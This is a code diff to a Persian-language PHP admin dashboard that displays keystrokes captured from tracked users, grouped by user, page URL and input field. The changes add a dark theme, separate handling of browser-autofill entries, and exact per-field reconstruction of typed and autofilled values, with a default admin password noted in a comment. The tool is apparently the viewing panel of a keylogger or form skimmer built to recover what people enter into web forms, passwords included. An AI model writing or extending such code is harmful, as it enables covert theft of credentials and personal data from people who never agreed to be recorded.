@@ -3,9 +3,9 @@
 
 session_start();
 
-// Admin credentials
-$adminUser = 'admin';
-$adminPass = 'admin123';
+// Admin credentials (username and hashed password)
+$adminUser = getenv('ADMIN_USER') ?: 'admin';
+$adminPassHash = getenv('ADMIN_PASS_HASH') ?: '$2y$10$C/ACuHxj/.L.Ei7g9AsDBumhcgSfC20XlNcpofkqdfHMXEyZWJBna'; // Default password: admin123
 
 $errorMsg = '';
 
@@ -21,7 +21,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
     $username = $_POST['username'] ?? '';
     $password = $_POST['password'] ?? '';
 
-    if ($username === $adminUser && $password === $adminPass) {
+    if ($username === $adminUser && password_verify($password, $adminPassHash)) {
         $_SESSION['dashboard_logged_in'] = true;
         header('Location: dashboard.php');
         exit;
@@ -42,15 +42,16 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
         :root {
             --primary: #2563eb;
             --primary-hover: #1d4ed8;
-            --bg: #f8fafc;
-            --card-bg: #ffffff;
-            --text: #1e293b;
-            --muted: #64748b;
-            --border: #e2e8f0;
-            --badge-bg: #eff6ff;
-            --badge-text: #1d4ed8;
-            --key-bg: #f1f5f9;
-            --key-border: #cbd5e1;
+            --bg: #0f172a;
+            --card-bg: #1e293b;
+            --text: #f8fafc;
+            --muted: #94a3b8;
+            --border: #334155;
+            --badge-bg: #1e293b;
+            --accent: #10b981;
+            --autofill-color: #f59e0b;
+            --key-bg: #0f172a;
+            --key-border: #475569;
         }
 
         * {
@@ -64,11 +65,11 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
             background-color: var(--bg);
             color: var(--text);
             line-height: 1.6;
-            padding: 20px;
+            padding: 24px;
         }
 
         .container {
-            max-width: 1100px;
+            max-width: 1200px;
             margin: 0 auto;
         }
 
@@ -77,14 +78,15 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
             justify-content: space-between;
             align-items: center;
             background: var(--card-bg);
-            padding: 16px 24px;
+            padding: 18px 28px;
             border-radius: 12px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            border: 1px solid var(--border);
             margin-bottom: 24px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
         }
 
         h1 {
-            font-size: 1.3rem;
+            font-size: 1.35rem;
             color: var(--text);
             font-weight: 700;
         }
@@ -99,11 +101,12 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
             cursor: pointer;
             text-decoration: none;
             font-size: 0.9rem;
-            transition: background-color 0.2s;
+            transition: all 0.2s;
         }
 
         .btn:hover {
             background-color: var(--primary-hover);
+            transform: translateY(-1px);
         }
 
         .btn-outline {
@@ -113,13 +116,13 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
         }
 
         .btn-outline:hover {
-            background: #f1f5f9;
+            background: #334155;
             color: var(--text);
         }
 
         .btn-sm {
-            padding: 4px 10px;
-            font-size: 0.8rem;
+            padding: 5px 12px;
+            font-size: 0.82rem;
         }
 
         /* Login Form */
@@ -129,7 +132,8 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
             background: var(--card-bg);
             padding: 32px;
             border-radius: 12px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            border: 1px solid var(--border);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
         }
 
         .form-group {
@@ -145,17 +149,20 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
 
         input[type="text"], input[type="password"] {
             width: 100%;
-            padding: 10px;
+            padding: 10px 12px;
+            background: var(--bg);
             border: 1px solid var(--border);
+            color: var(--text);
             border-radius: 8px;
             font-size: 0.95rem;
             direction: ltr;
         }
 
         .error {
-            background: #fef2f2;
-            color: #dc2626;
-            padding: 10px;
+            background: rgba(220, 38, 38, 0.2);
+            border: 1px solid #ef4444;
+            color: #fca5a5;
+            padding: 10px 14px;
             border-radius: 8px;
             margin-bottom: 16px;
             font-size: 0.85rem;
@@ -175,7 +182,7 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
         }
 
         .breadcrumb-item {
-            color: var(--primary);
+            color: #60a5fa;
             cursor: pointer;
         }
 
@@ -191,25 +198,19 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
             color: var(--muted);
         }
 
-        /* Layout panels */
-        .grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 20px;
-        }
-
+        /* Layout cards */
         .card {
             background: var(--card-bg);
             border-radius: 12px;
             border: 1px solid var(--border);
-            padding: 20px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+            padding: 24px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.25);
         }
 
         .card-title {
-            font-size: 1.1rem;
-            margin-bottom: 16px;
-            padding-bottom: 8px;
+            font-size: 1.15rem;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
             border-bottom: 1px solid var(--border);
             display: flex;
             justify-content: space-between;
@@ -222,10 +223,11 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
         }
 
         .list-item {
-            padding: 12px 16px;
+            padding: 14px 18px;
+            background: var(--bg);
             border: 1px solid var(--border);
             border-radius: 8px;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             cursor: pointer;
             display: flex;
             justify-content: space-between;
@@ -234,74 +236,125 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
         }
 
         .list-item:hover {
-            background-color: var(--badge-bg);
             border-color: var(--primary);
-        }
-
-        .list-item.active {
-            background-color: var(--badge-bg);
-            border-color: var(--primary);
-            font-weight: 600;
+            background: #1e293b;
         }
 
         .badge {
-            background: var(--key-bg);
+            background: #334155;
             color: var(--muted);
-            padding: 2px 8px;
+            padding: 3px 10px;
             border-radius: 12px;
             font-size: 0.8rem;
         }
 
-        /* Keystrokes display */
-        .keys-container {
+        .badge-autofill {
+            background: rgba(245, 158, 11, 0.2);
+            color: var(--autofill-color);
+            border: 1px solid rgba(245, 158, 11, 0.4);
+        }
+
+        .badge-key {
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--accent);
+            border: 1px solid rgba(16, 185, 129, 0.4);
+        }
+
+        /* Dark Terminal Style Reconstruction & Keys Display */
+        .terminal-box {
+            background: #090d16;
+            border: 1px solid #1e293b;
+            border-radius: 10px;
+            padding: 16px 20px;
+            margin-top: 16px;
+            font-family: "Fira Code", Monaco, Consolas, "Courier New", monospace;
+            box-shadow: inset 0 2px 6px rgba(0,0,0,0.5);
+        }
+
+        .terminal-header {
             display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-            margin-top: 16px;
-            padding: 16px;
-            background: #fafafa;
-            border-radius: 8px;
-            border: 1px dashed var(--border);
-            min-height: 80px;
-        }
-
-        .key-badge {
-            display: inline-flex;
-            flex-direction: column;
+            justify-content: space-between;
             align-items: center;
-            background: var(--card-bg);
-            border: 1px solid var(--key-border);
-            border-radius: 6px;
-            padding: 6px 10px;
-            box-shadow: 0 2px 0 var(--key-border);
-            font-family: monospace;
-            min-width: 36px;
-            text-align: center;
-        }
-
-        .key-badge .char {
-            font-size: 1.1rem;
-            font-weight: bold;
-            color: var(--text);
-        }
-
-        .key-badge .meta {
-            font-size: 0.65rem;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #1e293b;
             color: var(--muted);
-            margin-top: 2px;
+            font-size: 0.85rem;
         }
 
-        .text-preview {
-            background: #1e293b;
-            color: #10b981;
-            font-family: monospace;
-            padding: 14px;
-            border-radius: 8px;
-            margin-top: 16px;
+        .reconstructed-content {
+            color: var(--accent);
             white-space: pre-wrap;
             word-break: break-all;
             direction: ltr;
             text-align: left;
+            font-size: 0.95rem;
+            line-height: 1.7;
+        }
+
+        .reconstructed-field-line {
+            margin-bottom: 8px;
+        }
+
+        .reconstructed-field-tag {
+            color: #60a5fa;
+            font-weight: bold;
+        }
+
+        .reconstructed-value {
+            color: #f1f5f9;
+            background: #1e293b;
+            padding: 2px 8px;
+            border-radius: 4px;
+            margin-left: 6px;
+        }
+
+        .keys-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 12px;
+        }
+
+        .key-badge-dark {
+            display: inline-flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            padding: 8px 12px;
+            min-width: 44px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.4);
+            transition: transform 0.15s, border-color 0.15s;
+            font-family: monospace;
+        }
+
+        .key-badge-dark:hover {
+            border-color: var(--primary);
+            transform: translateY(-2px);
+        }
+
+        .key-badge-dark.is-autofill {
+            border-color: rgba(245, 158, 11, 0.5);
+            background: rgba(245, 158, 11, 0.05);
+        }
+
+        .key-badge-dark .char {
+            font-size: 1.15rem;
+            font-weight: bold;
+            color: var(--text);
+        }
+
+        .key-badge-dark.is-autofill .char {
+            color: var(--autofill-color);
+        }
+
+        .key-badge-dark .meta {
+            font-size: 0.68rem;
+            color: var(--muted);
+            margin-top: 3px;
         }
 
         .field-tabs {
@@ -313,11 +366,18 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
 
         .field-tab {
             padding: 8px 14px;
-            border-radius: 6px;
-            background: var(--key-bg);
+            border-radius: 8px;
+            background: var(--bg);
+            color: var(--muted);
             cursor: pointer;
             font-size: 0.85rem;
             border: 1px solid var(--border);
+            transition: all 0.2s;
+        }
+
+        .field-tab:hover {
+            border-color: var(--primary);
+            color: var(--text);
         }
 
         .field-tab.active {
@@ -329,8 +389,8 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
         .empty-state {
             text-align: center;
             color: var(--muted);
-            padding: 40px 0;
-            font-size: 0.95rem;
+            padding: 30px 0;
+            font-size: 0.9rem;
         }
 
         .loading {
@@ -416,15 +476,22 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
                     <!-- Fields dynamically populated -->
                 </div>
 
-                <div style="margin-top: 16px;">
-                    <div style="display: flex; justify-content: space-between; align-items: center;">
-                        <strong style="font-size: 0.9rem;">ترتیب دقیق کلیدهای فشرده‌شده:</strong>
+                <!-- Text Reconstruction Section -->
+                <div class="terminal-box">
+                    <div class="terminal-header">
+                        <span>بازسازی دقیق مقادیر کادرها (Text Reconstruction)</span>
+                        <span id="reconstruction-status" class="badge">آماده</span>
+                    </div>
+                    <div class="reconstructed-content" id="text-reconstruction"></div>
+                </div>
+
+                <!-- Exact Keystrokes Visualizer -->
+                <div class="terminal-box" style="margin-top: 20px;">
+                    <div class="terminal-header">
+                        <span>نمایش دقیق کلیدهای فشرده‌شده و پرکننده خودکار (Exact Key Sequence)</span>
                         <span id="keystroke-count" class="badge">0 کلید</span>
                     </div>
-
-                    <div class="text-preview" id="text-reconstruction" title="خروجی متنی بازسازی‌شده"></div>
-
-                    <div class="keys-container" id="keys-list">
+                    <div class="keys-grid" id="keys-list">
                         <div class="empty-state">یک کادر ورودی را انتخاب کنید یا دکمه «نمایش همه کلیدها» را بزنید.</div>
                     </div>
                 </div>
@@ -497,7 +564,7 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
                     container.innerHTML = data.users.map(u => `
                         <li class="list-item" onclick="selectUser('${escapeJs(u)}')">
                             <span>user : <strong>${escapeHtml(u)}</strong></span>
-                            <span class="badge">مشاهده فعالیت ها &larr;</span>
+                            <span class="badge">مشاهده فعالیت‌ها &larr;</span>
                         </li>
                     `).join('');
                 } else {
@@ -594,7 +661,7 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
         const countBadge = document.getElementById('keystroke-count');
 
         keysContainer.innerHTML = '<div class="loading">در حال دریافت کلیدها...</div>';
-        textPreview.innerText = '';
+        textPreview.innerHTML = '<span class="loading">در حال پردازش بازسازی متنی...</span>';
 
         let url = `api.php?action=get_keys&user_id=${encodeURIComponent(userId)}&page_url=${encodeURIComponent(pageUrl)}`;
         if (fieldId && fieldId !== 'all') {
@@ -614,7 +681,7 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
                         return;
                     }
 
-                    // Render individual key badges
+                    // Render dark styled key badges
                     keysContainer.innerHTML = keys.map((k, index) => {
                         let displayChar = k.key_char;
                         if (displayChar === ' ') displayChar = '␣';
@@ -622,29 +689,59 @@ $isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
                         if (displayChar === 'Backspace') displayChar = '⌫';
                         if (displayChar === 'Tab') displayChar = '⇥';
 
+                        const isAutofill = k.key_code === 'Autofill';
+                        const badgeClass = isAutofill ? 'key-badge-dark is-autofill' : 'key-badge-dark';
+                        const typeLabel = isAutofill ? 'Autofill' : `#${k.sequence_order}`;
+
                         return `
-                            <div class="key-badge" title="Field: ${escapeHtml(k.field_id)} | Order: #${k.sequence_order}">
+                            <div class="${badgeClass}" title="Field: ${escapeHtml(k.field_id)} | Code: ${escapeHtml(k.key_code)} | Order: #${k.sequence_order}">
                                 <span class="char">${escapeHtml(displayChar)}</span>
-                                <span class="meta">#${k.sequence_order}</span>
+                                <span class="meta">${escapeHtml(typeLabel)}</span>
                             </div>
                         `;
                     }).join('');
 
-                    // Reconstruct text output simulating typing
-                    let reconstructed = '';
+                    // Precise text reconstruction per field without autofill collision
+                    const fieldValues = {};
+                    const fieldAutofillActive = {};
+
                     keys.forEach(k => {
-                        if (k.key_char === 'Backspace') {
-                            reconstructed = reconstructed.slice(0, -1);
-                        } else if (k.key_char === 'Enter') {
-                            reconstructed += '\n';
-                        } else if (k.key_char === 'Tab') {
-                            reconstructed += '\t';
-                        } else if (k.key_char.length === 1) {
-                            reconstructed += k.key_char;
+                        const fId = k.field_id;
+                        if (!fieldValues[fId]) {
+                            fieldValues[fId] = '';
+                            fieldAutofillActive[fId] = false;
+                        }
+
+                        if (k.key_code === 'Autofill') {
+                            // If first character of an autofill block, reset/overwrite field value cleanly
+                            if (!fieldAutofillActive[fId]) {
+                                fieldValues[fId] = '';
+                                fieldAutofillActive[fId] = true;
+                            }
+                            fieldValues[fId] += k.key_char;
+                        } else {
+                            fieldAutofillActive[fId] = false;
+                            if (k.key_char === 'Backspace') {
+                                fieldValues[fId] = fieldValues[fId].slice(0, -1);
+                            } else if (k.key_char === 'Enter') {
+                                fieldValues[fId] += '\n';
+                            } else if (k.key_char === 'Tab') {
+                                fieldValues[fId] += '\t';
+                            } else if (k.key_char && k.key_char.length === 1) {
+                                fieldValues[fId] += k.key_char;
+                            }
                         }
                     });
 
-                    textPreview.innerText = reconstructed ? `بازسازی متنی: ${reconstructed}` : '(شامل کلیدهای غیرمتنی)';
+                    let reconstructionHtml = '';
+                    for (const [fId, val] of Object.entries(fieldValues)) {
+                        reconstructionHtml += `<div class="reconstructed-field-line">
+                            <span class="reconstructed-field-tag">[${escapeHtml(fId)}]:</span>
+                            <span class="reconstructed-value">${escapeHtml(val || '(خالی)')}</span>
+                        </div>`;
+                    }
+
+                    textPreview.innerHTML = reconstructionHtml || 'متن ورودی خالی است.';
                 } else {
                     keysContainer.innerHTML = `<div class="error">خطا: ${escapeHtml(data.message)}</div>`;
                 }
